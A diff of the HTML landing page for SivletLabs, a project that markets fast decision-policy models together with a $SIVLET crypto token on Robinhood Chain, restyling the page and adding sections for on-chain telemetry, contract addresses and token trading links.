@@ -4,13 +4,13 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>SivletLabs | Institute for System-1 Decision Intelligence & Evaluation</title>
-  <meta name="description" content="Non-autoregressive System-1 decision foundation models and Gymnasium-compliant evaluation infrastructure. Sub-15ms calibrated policies via x402 micropayments. Protocol revenue buys back and burns $SIVLET on Robinhood Chain.">
+  <meta name="description" content="Frontier non-autoregressive System-1 decision foundation models and Gymnasium-compliant evaluation infrastructure. Powered by RFC 7231 HTTP 402 micropayments on Robinhood Chain.">
   <link rel="icon" type="image/png" href="assets/logo.png">
   
   <!-- Fonts -->
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:ital,wght@0,400;0,500;0,600;1,400&family=Space+Grotesk:wght@500;600;700&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&family=Space+Grotesk:wght@500;600;700&display=swap" rel="stylesheet">
   
   <!-- Tailwind CSS CDN -->
   <script src="https://cdn.tailwindcss.com"></script>
@@ -21,23 +21,21 @@
         extend: {
           colors: {
             lab: {
-              black: '#07090e',
-              darker: '#0a0e17',
-              card: '#0e1422',
-              cardHover: '#131b2e',
-              border: 'rgba(56, 189, 248, 0.14)',
-              borderActive: 'rgba(0, 240, 255, 0.45)',
+              950: '#07080b',
+              900: '#0b0d13',
+              850: '#10131b',
+              800: '#161a25',
+              700: '#23293a',
+              border: 'rgba(255, 255, 255, 0.08)',
+              borderHover: 'rgba(255, 255, 255, 0.16)',
               emerald: '#10b981',
-              emeraldGlow: 'rgba(16, 185, 129, 0.25)',
-              cyan: '#00f0ff',
-              cyanGlow: 'rgba(0, 240, 255, 0.25)',
-              amber: '#f59e0b',
-              purple: '#8b5cf6',
-              muted: '#94a3b8'
+              emeraldMuted: 'rgba(16, 185, 129, 0.12)',
+              cyan: '#06b6d4',
+              muted: '#8e9bb0'
             }
           },
           fontFamily: {
-            sans: ['Inter', 'system-ui', 'sans-serif'],
+            sans: ['Inter', '-apple-system', 'BlinkMacSystemFont', 'sans-serif'],
             mono: ['"JetBrains Mono"', 'monospace'],
             display: ['"Space Grotesk"', 'sans-serif']
           }
@@ -51,44 +49,24 @@
 
   <style>
     ::selection {
-      background-color: rgba(16, 185, 129, 0.25);
+      background-color: rgba(16, 185, 129, 0.2);
       color: #ffffff;
     }
     
-    .bg-grid-pattern {
-      background-size: 32px 32px;
+    .bg-grid {
+      background-size: 40px 40px;
       background-image: 
-        linear-gradient(to right, rgba(255, 255, 255, 0.025) 1px, transparent 1px),
-        linear-gradient(to bottom, rgba(255, 255, 255, 0.025) 1px, transparent 1px);
+        linear-gradient(to right, rgba(255, 255, 255, 0.02) 1px, transparent 1px),
+        linear-gradient(to bottom, rgba(255, 255, 255, 0.02) 1px, transparent 1px);
     }
 
-    .radial-lab-glow {
-      background: radial-gradient(circle at 50% 15%, rgba(16, 185, 129, 0.07) 0%, rgba(0, 240, 255, 0.04) 35%, transparent 70%);
+    .lab-panel {
+      background: #0b0d13;
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      transition: border-color 0.2s ease, box-shadow 0.2s ease;
     }
-
-    .lab-glass {
-      background: rgba(14, 20, 34, 0.75);
-      backdrop-filter: blur(16px);
-      -webkit-backdrop-filter: blur(16px);
-      border: 1px solid rgba(56, 189, 248, 0.12);
-      box-shadow: 0 10px 30px -10px rgba(0, 0, 0, 0.5);
-    }
-
-    .lab-glass:hover {
-      border-color: rgba(16, 185, 129, 0.35);
-      box-shadow: 0 12px 36px -10px rgba(16, 185, 129, 0.08);
-    }
-
-    .flow-line {
-      background: linear-gradient(90deg, #10b981, #00f0ff, #8b5cf6, #10b981);
-      background-size: 300% 300%;
-      animation: gradientFlow 4s ease infinite;
-    }
-
-    @keyframes gradientFlow {
-      0% { background-position: 0% 50%; }
-      50% { background-position: 100% 50%; }
-      100% { background-position: 0% 50%; }
+    .lab-panel:hover {
+      border-color: rgba(255, 255, 255, 0.16);
     }
 
     ::-webkit-scrollbar {
@@ -96,231 +74,306 @@
       height: 6px;
     }
     ::-webkit-scrollbar-track {
-      background: #07090e;
+      background: #07080b;
     }
     ::-webkit-scrollbar-thumb {
-      background: #1e293b;
+      background: #1e2433;
       border-radius: 3px;
     }
     ::-webkit-scrollbar-thumb:hover {
-      background: #10b981;
+      background: #2b3449;
     }
   </style>
 </head>
-<body class="bg-lab-black text-slate-200 font-sans antialiased overflow-x-hidden relative selection:bg-emerald-500/20 selection:text-emerald-200">
+<body class="bg-lab-950 text-slate-200 font-sans antialiased overflow-x-hidden selection:bg-emerald-500/20 selection:text-emerald-300">
 
-  <!-- Background Layer -->
-  <div class="fixed inset-0 bg-grid-pattern pointer-events-none z-0"></div>
-  <div class="fixed inset-0 radial-lab-glow pointer-events-none z-0"></div>
-  <div class="fixed top-0 left-1/2 -translate-x-1/2 w-[1100px] h-[450px] bg-emerald-500/10 blur-[140px] rounded-full pointer-events-none z-0"></div>
+  <!-- Subtle Ambient Grid Background -->
+  <div class="fixed inset-0 bg-grid pointer-events-none z-0"></div>
 
   <!-- ========================================================================= -->
-  <!-- 0. REAL-TIME PROTOCOL MARKET TICKER BAR                                  -->
+  <!-- 1. NAVIGATION BAR                                                         -->
   <!-- ========================================================================= -->
-  <div class="relative z-50 w-full bg-slate-950/95 border-b border-slate-800/80 px-4 py-1.5 text-xs font-mono">
-    <div class="max-w-7xl mx-auto flex flex-wrap items-center justify-between gap-y-1 gap-x-4">
-      <div class="flex items-center flex-wrap gap-x-3 gap-y-1">
-        <div class="flex items-center gap-1.5 text-emerald-400 font-bold">
-          <span class="flex h-2 w-2 rounded-full bg-emerald-400 animate-pulse"></span>
-          <span>$SIVLET:</span>
-          <span id="tickerPriceUsd" class="text-white font-mono">$0.00000450</span>
-          <span id="tickerPriceEth" class="text-slate-400 text-[11px] font-normal">(~0.00000000170 ETH)</span>
-        </div>
-        <div class="hidden sm:flex items-center gap-1.5 text-slate-400 text-[11px]">
-          <span class="text-slate-700">|</span>
-          <span>FDV:</span>
-          <span id="tickerFdv" class="text-slate-200 font-semibold">$4,502</span>
-        </div>
-        <div class="hidden md:flex items-center gap-1.5 text-slate-400 text-[11px]">
-          <span class="text-slate-700">|</span>
-          <span>Robinhood Chain:</span>
-          <span class="text-cyan-400">ID 4663</span>
-        </div>
-      </div>
-
-      <div class="flex items-center gap-3 text-[11px]">
-        <div class="flex items-center gap-1.5 text-slate-300">
-          <i data-lucide="trending-up" class="w-3.5 h-3.5 text-cyan-400"></i>
-          <span>Pons Bonding Curve:</span>
-          <span id="tickerCurveReserve" class="text-emerald-400 font-semibold">1.68 / 4.20 ETH</span>
-          <span id="tickerCurvePct" class="px-1.5 py-0.5 rounded bg-emerald-950 border border-emerald-500/30 text-emerald-300 text-[10px] font-semibold">40.0%</span>
-        </div>
-        <div class="hidden lg:flex items-center gap-1.5 text-slate-500">
-          <span class="text-slate-700">|</span>
-          <span class="text-amber-400 flex items-center gap-1">
-            <i data-lucide="flame" class="w-3 h-3 text-amber-400"></i> 100% Revenue Sinks to Burn
-          </span>
-        </div>
-      </div>
-    </div>
-  </div>
-
-  <!-- ========================================================================= -->
-  <!-- 1. NAVIGATION                                                             -->
-  <!-- ========================================================================= -->
-  <header class="sticky top-0 z-50 w-full border-b border-slate-800/80 bg-lab-black/85 backdrop-blur-xl transition-all">
+  <header class="sticky top-0 z-50 w-full border-b border-lab-border bg-lab-950/90 backdrop-blur-md">
     <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between">
       
       <!-- Brand Logo -->
       <a href="#" class="flex items-center gap-3 group">
-        <div class="relative w-9 h-9 rounded-lg bg-emerald-950/80 border border-emerald-500/40 flex items-center justify-center p-1.5 shadow-lg shadow-emerald-500/10 group-hover:border-emerald-400 transition-all">
+        <div class="w-8 h-8 rounded-md bg-lab-850 border border-lab-border flex items-center justify-center p-1 group-hover:border-emerald-500/50 transition-colors">
           <img src="assets/logo.png" alt="SivletLabs Logo" class="w-full h-full object-contain">
         </div>
-        <div class="flex flex-col">
-          <div class="flex items-center gap-1.5">
-            <span class="font-display font-bold text-lg text-white tracking-wider">SivletLabs</span>
-            <span class="flex h-2 w-2 rounded-full bg-emerald-400 animate-pulse"></span>
-          </div>
-          <span class="text-[10px] font-mono uppercase tracking-widest text-slate-400">Decision Institute</span>
+        <div class="flex items-center gap-2">
+          <span class="font-display font-semibold text-base text-white tracking-wide">SivletLabs</span>
+          <span class="text-[10px] font-mono uppercase px-1.5 py-0.5 rounded bg-lab-850 border border-lab-border text-slate-400">RESEARCH</span>
         </div>
       </a>
 
-      <!-- Desktop Nav -->
-      <nav class="hidden md:flex items-center gap-6 font-mono text-xs text-slate-300">
-        <a href="#playground" class="hover:text-emerald-400 transition-colors flex items-center gap-1.5">
-          <i data-lucide="play-circle" class="w-3.5 h-3.5 text-emerald-400"></i>
-          <span>Playground</span>
-        </a>
-        <a href="#swap-widget" class="hover:text-emerald-400 transition-colors flex items-center gap-1.5 text-emerald-300 font-semibold">
-          <i data-lucide="coins" class="w-3.5 h-3.5 text-emerald-400"></i>
-          <span>Acquire $SIVLET</span>
-        </a>
-        <a href="#research" class="hover:text-cyan-400 transition-colors flex items-center gap-1.5">
-          <i data-lucide="book-open" class="w-3.5 h-3.5 text-cyan-400"></i>
-          <span>Research &amp; Papers</span>
-        </a>
-        <a href="#tokenomics" class="hover:text-cyan-400 transition-colors">Treasury Flywheel</a>
-        <a href="#live-status" class="hover:text-cyan-400 transition-colors">Telemetry</a>
+      <!-- Desktop Nav Links -->
+      <nav class="hidden md:flex items-center gap-6 font-mono text-xs text-slate-400">
+        <a href="#playground" class="hover:text-white transition-colors">Playground</a>
+        <a href="#research" class="hover:text-white transition-colors">Architecture</a>
+        <a href="#evaluation" class="hover:text-white transition-colors">Harness (jev-eval)</a>
+        <a href="#telemetry" class="hover:text-white transition-colors">Telemetry</a>
+        <a href="#token" class="hover:text-white transition-colors">Token &amp; Pons</a>
         <a href="https://github.com/SivletLabs/jev-eval" target="_blank" class="hover:text-white transition-colors flex items-center gap-1">
-          <i data-lucide="github" class="w-3.5 h-3.5"></i>
           <span>GitHub</span>
+          <i data-lucide="arrow-up-right" class="w-3 h-3"></i>
         </a>
       </nav>
 
       <!-- Action Buttons -->
-      <div class="hidden sm:flex items-center gap-3">
-        <button onclick="connectWallet()" id="navWalletBtn" class="px-3 py-1.5 rounded-lg bg-slate-900 hover:bg-slate-800 border border-slate-700 hover:border-slate-600 text-xs font-mono text-slate-300 transition-all flex items-center gap-1.5">
-          <i data-lucide="wallet" class="w-3.5 h-3.5 text-cyan-400"></i>
+      <div class="flex items-center gap-3">
+        <button onclick="connectWallet()" id="navWalletBtn" class="hidden sm:flex items-center gap-1.5 px-3 py-1.5 rounded bg-lab-850 hover:bg-lab-800 border border-lab-border text-xs font-mono text-slate-300 transition-colors">
+          <i data-lucide="wallet" class="w-3.5 h-3.5 text-slate-400"></i>
           <span id="navWalletText">Connect Wallet</span>
         </button>
 
-        <a href="#swap-widget" class="px-3.5 py-1.5 rounded-lg bg-emerald-500 hover:bg-emerald-400 text-black font-semibold text-xs font-mono transition-all shadow-lg shadow-emerald-500/20 flex items-center gap-1.5">
-          <i data-lucide="zap" class="w-3.5 h-3.5 fill-current"></i>
-          <span>Get $SIVLET</span>
+        <a href="https://www.ponsfamily.com/launchpad/0xb7832Ca55ea7F9aa1504657376117B98deb4e2E1" target="_blank" class="px-3.5 py-1.5 rounded bg-white hover:bg-slate-100 text-black font-semibold text-xs font-mono transition-all flex items-center gap-1.5 shadow-sm">
+          <span>Trade on Pons</span>
+          <i data-lucide="arrow-up-right" class="w-3.5 h-3.5"></i>
         </a>
       </div>
 
-      <!-- Mobile Menu Button -->
-      <button id="mobileMenuBtn" class="md:hidden p-2 text-slate-400 hover:text-white">
-        <i data-lucide="menu" class="w-5 h-5"></i>
-      </button>
-
-    </div>
-
-    <!-- Mobile Nav Dropdown -->
-    <div id="mobileMenu" class="hidden md:hidden border-b border-slate-800 bg-lab-darker px-4 py-3 space-y-2 font-mono text-xs">
-      <a href="#playground" class="block py-1.5 text-emerald-400">Interactive Playground</a>
-      <a href="#swap-widget" class="block py-1.5 text-white font-semibold">Acquire $SIVLET Token</a>
-      <a href="#research" class="block py-1.5 text-slate-300">Research &amp; Papers</a>
-      <a href="#tokenomics" class="block py-1.5 text-slate-300">Treasury Flywheel</a>
-      <a href="#live-status" class="block py-1.5 text-slate-300">Live Status</a>
-      <a href="https://github.com/SivletLabs/jev-eval" target="_blank" class="block py-1.5 text-slate-300">GitHub (jev-eval)</a>
     </div>
   </header>
 
   <!-- ========================================================================= -->
   <!-- 2. HERO SECTION                                                           -->
   <!-- ========================================================================= -->
-  <section class="relative pt-12 pb-20 md:pt-20 md:pb-28 overflow-hidden z-10">
-    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 text-center">
+  <section class="relative pt-16 pb-20 md:pt-24 md:pb-28 border-b border-lab-border z-10">
+    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
       
-      <!-- Academic Institute Badge -->
-      <div class="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-slate-900/90 border border-emerald-500/30 text-[11px] font-mono text-emerald-400 mb-6 shadow-sm">
-        <span class="flex h-1.5 w-1.5 rounded-full bg-emerald-400 animate-ping"></span>
-        <span>FRONTIER AI RESEARCH · MODEL RELEASE v0.1</span>
-        <span class="text-slate-600">|</span>
-        <span class="text-slate-300 font-medium">Robinhood Chain Verified</span>
+      <!-- Announcement Pill -->
+      <div class="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-lab-850 border border-lab-border text-xs font-mono text-slate-300 mb-8">
+        <span class="w-1.5 h-1.5 rounded-full bg-emerald-400"></span>
+        <span>Sivlet-Decision-1 (v0.1) Online</span>
+        <span class="text-slate-600">/</span>
+        <span class="text-slate-400">Robinhood Chain (ID: 4663)</span>
       </div>
 
-      <!-- Hero Headline -->
-      <h1 class="font-display font-extrabold text-3xl sm:text-5xl lg:text-6xl text-white tracking-tight leading-tight max-w-5xl mx-auto mb-6">
-        Non-Autoregressive <span class="text-transparent bg-clip-text bg-gradient-to-r from-emerald-400 via-cyan-400 to-emerald-300">System-1 Decision Intelligence</span> for Autonomous Agents
+      <!-- Main Headline -->
+      <h1 class="font-display font-bold text-3xl sm:text-5xl lg:text-6xl text-white tracking-tight leading-[1.1] max-w-4xl mb-6">
+        Non-Autoregressive System-1 Decision Policies for Autonomous Agents
       </h1>
 
-      <!-- Subtitle -->
-      <p class="max-w-3xl mx-auto text-sm sm:text-base text-slate-300 leading-relaxed font-sans mb-8">
-        Sub-15ms calibrated policies over discrete action simplexes. Stop running 70B autoregressive models for binary routing. Settled per-call via RFC 7231 HTTP 402. All revenue autonomously buys back and burns <span class="font-mono text-emerald-400 font-semibold">$SIVLET</span> on Robinhood Chain.
+      <!-- Executive Subtitle -->
+      <p class="text-base sm:text-lg text-slate-400 font-sans leading-relaxed max-w-3xl mb-10">
+        Single forward-pass discrete policy inference over calibrated probability simplexes. Decoupling fast reactive decisions from heavy generative language models. Settled via RFC 7231 HTTP 402 micropayments on Robinhood Chain, programmatically funding automated token buyback and burn.
       </p>
 
-      <!-- Key Scientific & Market Metrics Strip -->
-      <div class="grid grid-cols-2 sm:grid-cols-4 gap-3 max-w-4xl mx-auto mb-10 font-mono text-xs">
-        <div class="bg-lab-card/80 p-3.5 rounded-lg border border-emerald-500/30 hover:border-emerald-500/60 transition-all text-left">
-          <div class="text-slate-400 text-[10px] uppercase flex items-center justify-between">
-            <span>$SIVLET Price</span>
-            <span class="flex h-1.5 w-1.5 rounded-full bg-emerald-400 animate-pulse"></span>
-          </div>
-          <div class="text-lg font-bold text-emerald-400 mt-0.5" id="heroPriceUsd">$0.00000450</div>
-          <div class="text-[10px] text-slate-400 flex items-center justify-between">
-            <span id="heroFdv">FDV: ~$4,502</span>
-            <span class="text-cyan-400 font-semibold">Robinhood</span>
-          </div>
-        </div>
-        <div class="bg-lab-card/80 p-3.5 rounded-lg border border-slate-800/80 text-left">
-          <div class="text-slate-400 text-[10px] uppercase">P50 Latency</div>
-          <div class="text-lg font-bold text-white mt-0.5">12.4 ms</div>
-          <div class="text-[10px] text-slate-500">24.3&times; faster than LLMs</div>
-        </div>
-        <div class="bg-lab-card/80 p-3.5 rounded-lg border border-slate-800/80 text-left">
-          <div class="text-slate-400 text-[10px] uppercase">Maze 8x8 Win Rate</div>
-          <div class="text-lg font-bold text-cyan-400 mt-0.5">100.0%</div>
-          <div class="text-[10px] text-slate-500">Gymnasium standard</div>
-        </div>
-        <div class="bg-lab-card/80 p-3.5 rounded-lg border border-slate-800/80 text-left">
-          <div class="text-slate-400 text-[10px] uppercase">Brier Calibration</div>
-          <div class="text-lg font-bold text-amber-400 mt-0.5">-0.042</div>
-          <div class="text-[10px] text-slate-500">Strictly proper score</div>
-        </div>
+      <!-- Primary Action Buttons -->
+      <div class="flex flex-wrap items-center gap-3 mb-16">
+        <a href="#playground" class="px-5 py-2.5 rounded bg-emerald-500 hover:bg-emerald-400 text-black font-semibold text-xs font-mono transition-colors flex items-center gap-2">
+          <i data-lucide="terminal" class="w-3.5 h-3.5"></i>
+          <span>Launch Playground</span>
+        </a>
+        <a href="https://www.ponsfamily.com/launchpad/0xb7832Ca55ea7F9aa1504657376117B98deb4e2E1" target="_blank" class="px-5 py-2.5 rounded bg-lab-850 hover:bg-lab-800 border border-lab-border text-white text-xs font-mono transition-colors flex items-center gap-2">
+          <i data-lucide="coins" class="w-3.5 h-3.5 text-slate-400"></i>
+          <span>Acquire $SIVLET on Pons</span>
+        </a>
+        <a href="https://github.com/SivletLabs/jev-eval" target="_blank" class="px-5 py-2.5 rounded bg-transparent hover:bg-lab-850 border border-lab-border text-slate-300 hover:text-white text-xs font-mono transition-colors flex items-center gap-2">
+          <i data-lucide="github" class="w-3.5 h-3.5"></i>
+          <span>jev-eval Harness</span>
+        </a>
       </div>
 
-      <!-- Action Buttons -->
-      <div class="flex flex-col sm:flex-row items-center justify-center gap-4">
-        <a href="#playground" class="w-full sm:w-auto px-6 py-3 rounded-lg bg-emerald-500 hover:bg-emerald-400 text-black font-bold text-xs font-mono transition-all shadow-xl shadow-emerald-500/20 flex items-center justify-center gap-2">
-          <i data-lucide="play" class="w-4 h-4 fill-current"></i>
-          <span>Launch Interactive Playground</span>
-        </a>
-        <a href="#swap-widget" class="w-full sm:w-auto px-6 py-3 rounded-lg bg-lab-card hover:bg-slate-800 border border-emerald-500/40 text-emerald-300 hover:text-white font-semibold text-xs font-mono transition-all flex items-center justify-center gap-2">
-          <i data-lucide="coins" class="w-4 h-4 text-emerald-400"></i>
-          <span>Acquire $SIVLET (Robinhood Chain)</span>
-        </a>
-        <button onclick="openLitepaperModal()" class="w-full sm:w-auto px-6 py-3 rounded-lg bg-lab-darker hover:bg-slate-900 border border-slate-800 text-slate-300 hover:text-white font-medium text-xs font-mono transition-all flex items-center justify-center gap-2">
-          <i data-lucide="file-text" class="w-4 h-4 text-cyan-400"></i>
-          <span>Technical Litepaper</span>
-        </button>
+      <!-- Institutional Specs Grid (Authentic, Factual Data) -->
+      <div class="grid grid-cols-2 md:grid-cols-4 gap-px bg-lab-border border border-lab-border rounded-lg overflow-hidden font-mono text-xs">
+        <div class="bg-lab-900 p-4">
+          <div class="text-[11px] text-slate-500 uppercase tracking-wider mb-1">Architecture</div>
+          <div class="text-sm font-semibold text-white">Non-Autoregressive Simplex</div>
+          <div class="text-[11px] text-slate-500 mt-0.5">Single forward pass ($\pi_\theta \in \Delta^{K-1}$)</div>
+        </div>
+
+        <div class="bg-lab-900 p-4">
+          <div class="text-[11px] text-slate-500 uppercase tracking-wider mb-1">Scoring Metric</div>
+          <div class="text-sm font-semibold text-white">Strictly Proper Scoring</div>
+          <div class="text-[11px] text-slate-500 mt-0.5">Negative Brier &amp; Logarithmic rewards</div>
+        </div>
+
+        <div class="bg-lab-900 p-4">
+          <div class="text-[11px] text-slate-500 uppercase tracking-wider mb-1">Evaluation Framework</div>
+          <div class="text-sm font-semibold text-white">Gymnasium RL Harness</div>
+          <div class="text-[11px] text-slate-500 mt-0.5">Full MDP transitions &amp; GAE advantage</div>
+        </div>
+
+        <div class="bg-lab-900 p-4">
+          <div class="text-[11px] text-slate-500 uppercase tracking-wider mb-1">Machine Settlement</div>
+          <div class="text-sm font-semibold text-white">RFC 7231 / HTTP 402</div>
+          <div class="text-[11px] text-slate-500 mt-0.5">$0.001/call on Robinhood Chain</div>
+        </div>
       </div>
 
     </div>
   </section>
 
   <!-- ========================================================================= -->
-  <!-- 3. INTERACTIVE DECISION PLAYGROUND & LIVE API TESTING                     -->
+  <!-- 3. LIVE ON-CHAIN PROTOCOL TELEMETRY & PONS INTEGRATION                    -->
   <!-- ========================================================================= -->
-  <section id="playground" class="py-20 border-t border-slate-800/80 relative z-10 bg-lab-darker/60">
+  <section id="telemetry" class="py-20 border-b border-lab-border z-10">
+    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+      
+      <div class="flex flex-col md:flex-row md:items-end justify-between mb-10 gap-4">
+        <div>
+          <div class="text-xs font-mono text-emerald-400 uppercase tracking-wider mb-1">On-Chain Protocol State</div>
+          <h2 class="font-display font-bold text-2xl sm:text-3xl text-white">Live Market Telemetry &amp; Reserves</h2>
+          <p class="text-xs sm:text-sm text-slate-400 mt-1 max-w-2xl font-sans">
+            Real-time liquidity and reserve data queried directly from Robinhood Chain RPC (Chain ID: 4663).
+          </p>
+        </div>
+
+        <div class="flex items-center gap-2 font-mono text-xs text-slate-400 bg-lab-900 px-3 py-1.5 rounded border border-lab-border">
+          <span class="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse"></span>
+          <span>Robinhood Mainnet &middot; RPC Sync</span>
+        </div>
+      </div>
+
+      <!-- 4 Telemetry Metrics Cards -->
+      <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 mb-8">
+        
+        <!-- Card 1: Live SIVLET Price -->
+        <div class="lab-panel p-5 rounded-lg flex flex-col justify-between">
+          <div>
+            <div class="flex items-center justify-between text-xs font-mono text-slate-500 uppercase mb-2">
+              <span>$SIVLET Price</span>
+              <i data-lucide="tag" class="w-3.5 h-3.5 text-slate-400"></i>
+            </div>
+            <div class="font-mono font-bold text-2xl text-white" id="livePriceUsd">--</div>
+            <div class="text-[11px] font-mono text-slate-400 mt-1" id="livePriceEth">--</div>
+          </div>
+          <div class="mt-4 pt-3 border-t border-lab-border flex items-center justify-between text-[11px] font-mono">
+            <span class="text-slate-500">Implied FDV</span>
+            <span class="text-slate-300 font-semibold" id="liveFdv">--</span>
+          </div>
+        </div>
+
+        <!-- Card 2: Pons Bonding Curve Reserve -->
+        <div class="lab-panel p-5 rounded-lg flex flex-col justify-between">
+          <div>
+            <div class="flex items-center justify-between text-xs font-mono text-slate-500 uppercase mb-2">
+              <span>Bonding Pool Reserve</span>
+              <i data-lucide="layers" class="w-3.5 h-3.5 text-slate-400"></i>
+            </div>
+            <div class="font-mono font-bold text-2xl text-emerald-400" id="liveCurveReserveEth">--</div>
+            <div class="text-[11px] font-mono text-slate-400 mt-1" id="liveCurveTokens">--</div>
+          </div>
+          <div class="mt-4 pt-3 border-t border-lab-border flex items-center justify-between text-[11px] font-mono">
+            <span class="text-slate-500">Graduation Target</span>
+            <span class="text-emerald-400 font-semibold" id="liveCurveGraduation">-- / 4.20 ETH</span>
+          </div>
+        </div>
+
+        <!-- Card 3: Treasury Contract Balance -->
+        <div class="lab-panel p-5 rounded-lg flex flex-col justify-between">
+          <div>
+            <div class="flex items-center justify-between text-xs font-mono text-slate-500 uppercase mb-2">
+              <span>Treasury Balance</span>
+              <i data-lucide="shield" class="w-3.5 h-3.5 text-slate-400"></i>
+            </div>
+            <div class="font-mono font-bold text-2xl text-white" id="liveTreasuryEth">--</div>
+            <div class="text-[11px] font-mono text-slate-400 mt-1">Contract: 0x6B50...5F8A</div>
+          </div>
+          <div class="mt-4 pt-3 border-t border-lab-border flex items-center justify-between text-[11px] font-mono">
+            <span class="text-slate-500">Trigger Threshold</span>
+            <span class="text-slate-300 font-semibold">50.0 USDC</span>
+          </div>
+        </div>
+
+        <!-- Card 4: Tokens Burned -->
+        <div class="lab-panel p-5 rounded-lg flex flex-col justify-between">
+          <div>
+            <div class="flex items-center justify-between text-xs font-mono text-slate-500 uppercase mb-2">
+              <span>Tokens Incinerated</span>
+              <i data-lucide="flame" class="w-3.5 h-3.5 text-slate-400"></i>
+            </div>
+            <div class="font-mono font-bold text-2xl text-amber-400" id="liveBurnedTokens">--</div>
+            <div class="text-[11px] font-mono text-slate-400 mt-1">Destination: 0x0...dead</div>
+          </div>
+          <div class="mt-4 pt-3 border-t border-lab-border flex items-center justify-between text-[11px] font-mono">
+            <span class="text-slate-500">Status</span>
+            <span class="text-slate-300 font-semibold" id="liveBurnStatus">--</span>
+          </div>
+        </div>
+
+      </div>
+
+      <!-- Protocol Verified Contract Ledger & Pons Action Panel -->
+      <div id="token" class="lab-panel p-6 rounded-lg border border-lab-border flex flex-col lg:flex-row items-stretch lg:items-center justify-between gap-6">
+        
+        <!-- Left: Contract Address Directory -->
+        <div class="space-y-2 font-mono text-xs flex-1">
+          <div class="text-[11px] uppercase tracking-wider text-slate-500 mb-2">Verified Contract Infrastructure</div>
+          
+          <div class="flex flex-wrap items-center gap-y-2 gap-x-4">
+            <div class="flex items-center gap-2 bg-lab-900 px-3 py-1.5 rounded border border-lab-border">
+              <span class="text-slate-500">Token:</span>
+              <a href="https://robinhoodchain.blockscout.com/token/0xb7832Ca55ea7F9aa1504657376117B98deb4e2E1" target="_blank" class="text-white hover:text-emerald-400 transition-colors">
+                0xb7832Ca55ea7F9aa1504657376117B98deb4e2E1
+              </a>
+              <button onclick="copyToClipboard('0xb7832Ca55ea7F9aa1504657376117B98deb4e2E1')" class="text-slate-500 hover:text-white" title="Copy Address">
+                <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+              </button>
+            </div>
+
+            <div class="flex items-center gap-2 bg-lab-900 px-3 py-1.5 rounded border border-lab-border">
+              <span class="text-slate-500">Treasury:</span>
+              <a href="https://robinhoodchain.blockscout.com/address/0x6B50f02D2292a28928bCe0F97b654E4DCbC75F8A" target="_blank" class="text-white hover:text-emerald-400 transition-colors">
+                0x6B50f02D...5F8A
+              </a>
+              <button onclick="copyToClipboard('0x6B50f02D2292a28928bCe0F97b654E4DCbC75F8A')" class="text-slate-500 hover:text-white" title="Copy Address">
+                <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+              </button>
+            </div>
+
+            <div class="flex items-center gap-2 bg-lab-900 px-3 py-1.5 rounded border border-lab-border">
+              <span class="text-slate-500">Pons Pool:</span>
+              <a href="https://robinhoodchain.blockscout.com/address/0x5F02BE04d20aB66cf5Ea33ECda25194AECAd5601" target="_blank" class="text-white hover:text-emerald-400 transition-colors">
+                0x5F02BE...5601
+              </a>
+            </div>
+          </div>
+        </div>
+
+        <!-- Right: Direct Web3 Actions -->
+        <div class="flex flex-wrap items-center gap-2.5">
+          <a href="https://www.ponsfamily.com/launchpad/0xb7832Ca55ea7F9aa1504657376117B98deb4e2E1" target="_blank" class="px-4 py-2 rounded bg-emerald-500 hover:bg-emerald-400 text-black font-semibold text-xs font-mono transition-colors flex items-center gap-1.5 shadow-sm">
+            <span>Trade on Pons Launchpad</span>
+            <i data-lucide="external-link" class="w-3.5 h-3.5"></i>
+          </a>
+
+          <button onclick="addTokenToMetaMask()" class="px-3.5 py-2 rounded bg-lab-900 hover:bg-lab-800 border border-lab-border text-slate-300 text-xs font-mono transition-colors flex items-center gap-1.5">
+            <i data-lucide="plus-circle" class="w-3.5 h-3.5 text-slate-400"></i>
+            <span>Add to Wallet</span>
+          </button>
+
+          <button onclick="switchToRobinhoodChain()" class="px-3.5 py-2 rounded bg-lab-900 hover:bg-lab-800 border border-lab-border text-slate-300 text-xs font-mono transition-colors flex items-center gap-1.5">
+            <i data-lucide="network" class="w-3.5 h-3.5 text-slate-400"></i>
+            <span>Switch to Robinhood</span>
+          </button>
+        </div>
+
+      </div>
+
+    </div>
+  </section>
+
+  <!-- ========================================================================= -->
+  <!-- 4. INTERACTIVE DECISION PLAYGROUND & LIVE API                             -->
+  <!-- ========================================================================= -->
+  <section id="playground" class="py-20 border-b border-lab-border z-10">
     <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
       
       <div class="flex flex-col md:flex-row md:items-end justify-between mb-8 gap-4">
         <div>
-          <div class="flex items-center gap-2 font-mono text-xs uppercase tracking-wider text-emerald-400 mb-1">
-            <i data-lucide="terminal" class="w-4 h-4"></i> Live Evaluation Console
-          </div>
+          <div class="text-xs font-mono text-emerald-400 uppercase tracking-wider mb-1">Developer Console</div>
           <h2 class="font-display font-bold text-2xl sm:text-3xl text-white">System-1 Decision Playground</h2>
           <p class="text-xs sm:text-sm text-slate-400 mt-1 max-w-2xl font-sans">
-            Test real-time forward scoring. Requests execute against the global edge gateway (<code class="text-cyan-300 font-mono">sivlet-x402-gateway.sivletlabs.workers.dev</code>) and calculate true probability distributions.
+            Test discrete policy scoring in real time. Requests execute against the global edge gateway (<code class="text-slate-300 font-mono">sivlet-x402-gateway.sivletlabs.workers.dev</code>) and return calibrated probability simplexes.
           </p>
         </div>
 
